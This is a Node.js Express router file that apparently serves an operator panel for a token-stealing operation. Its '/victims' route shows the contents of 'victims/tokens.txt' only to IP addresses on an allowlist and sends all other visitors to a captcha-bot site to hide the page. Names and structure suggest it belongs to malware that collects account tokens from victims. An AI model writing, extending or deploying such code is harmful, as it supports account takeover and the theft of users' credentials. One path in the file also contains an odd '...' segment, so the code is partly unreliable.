const fs = require('node:fs')
const path = require('node:path')

const express = require('express')
const app = express.Router()

app.get('/victims', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
        const ips = (await fs.promises.readFile(path.join(__dirname, '...', 'bot', 'profile', 'ip.json')))

        if (!ips.includes(ip)) {
            return res.status(200).redirect('https://captcha.bot/')
        }

        res.setHeader('Content-Type', 'text/html')
        res.status(200).send(`
            <html>
                <head>
                    <style>
                        body { 
                            background-color: black; 
                            color: white; 
                            white-space: pre-wrap; 
                            font-family: monospace;
                        }
                    </style>
                </head>
                <body>${await fs.promises.readFile( path.join(__dirname, '..', 'victims', 'tokens.txt'))}</body>
            </html>
        `)
    } catch (error) {
        console.error(error)
        res.status(500).json({
            'status': 500,
            'message': 'Internal server error.'
        })
    }
})

module.exports = (app)